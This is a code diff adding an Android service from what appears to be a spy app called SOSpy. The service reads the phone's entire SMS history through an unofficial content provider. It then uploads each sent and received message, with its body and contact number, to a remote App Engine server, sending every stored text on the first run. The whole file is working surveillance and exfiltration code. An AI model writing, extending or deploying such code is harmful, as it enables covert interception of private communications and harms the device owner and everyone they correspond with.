@@ -1,0 +1,99 @@
+package com.prestomation.android.sospy.spy;
+
+import android.app.Service;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.IBinder;
+import android.util.Log;
+
+public class SmsService extends Service {
+
+	private static final String SMS_RECEIVED_TITLE = "SMS from ";
+	private static final String SMS_SENT_TITLE = "SMS to ";
+	private static final Uri SMS_URI = Uri.parse("content://sms"); //<--- This is not a public api
+	private static final String[] SMS_COLUMNS = { "_id", "date", "body", "address", "protocol" };
+	private static final String PREF_LAST_SMS_DATE = "smsDate";
+
+	@Override
+	public void onCreate() {
+
+		Log.i(SetupActivity.TAG, "Starting SmsService..");
+
+	}
+
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		// WARNING: We are using a non-public api for getting SMS. This is
+		// unsupported and may not work on future/other versions of Android
+		// It is virtually impossible to get sent SMS in all cases, code would
+		// need to be written specifically for every SMS client
+
+		final SharedPreferences prefs = Prefs.get(this);
+		SharedPreferences.Editor prefsEdit = prefs.edit();
+		String currentTime = String.valueOf(System.currentTimeMillis());
+		Log.i(SetupActivity.TAG, "Current Time: " + currentTime);
+
+		//On first run, this default value will cause EVERY SMS to be transmitted to server
+		String lastDate = prefs.getString(PREF_LAST_SMS_DATE, "1");
+		
+		Log.i(SetupActivity.TAG, "lastDate: " + lastDate);
+
+		// Get all SMS that have happened since our remembered date
+		final Cursor cursor = getContentResolver().query(SMS_URI, SMS_COLUMNS, "date > ?",
+				new String[] { lastDate }, null);
+		Log.i(SetupActivity.TAG, cursor.getCount() + " texts since last run");
+
+		prefsEdit.putString(PREF_LAST_SMS_DATE, currentTime);
+		prefsEdit.commit();
+
+		// Do the actual work in a worker thread. We don't want to tie up
+		// onStartCommand as this can tie up on UI/prompt a force close
+		new Thread(new Runnable() {
+			public void run() {
+
+				if (cursor.moveToFirst()) {
+
+					do {
+						// Iterate through all SMS since the last run and report
+						// them up
+						// to the SOSpyer service
+						String body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+								.toString();
+						String address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+								.toString();
+						String protocol = cursor
+								.getString(cursor.getColumnIndexOrThrow("protocol"));
+
+						String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
+
+						AppEngineClient client = new AppEngineClient(devID);
+						String title;
+						if (protocol == null) {
+							title = SMS_SENT_TITLE + address;
+						} else {
+							title = SMS_RECEIVED_TITLE + address;
+						}
+						client.sendSpyData(title, body);
+					} while (cursor.moveToNext());
+				}
+				Log.i(SetupActivity.TAG, "Finished sending SMS");
+			}
+		}).start();
+
+		return START_NOT_STICKY;
+
+	}
+
+	@Override
+	public void onDestroy() {
+		Log.i(SetupActivity.TAG, "Destroy SmsService activity");
+	}
+
+	@Override
+	public IBinder onBind(Intent intent) {
+		// We don't bind in this app
+		return null;
+	}
+}
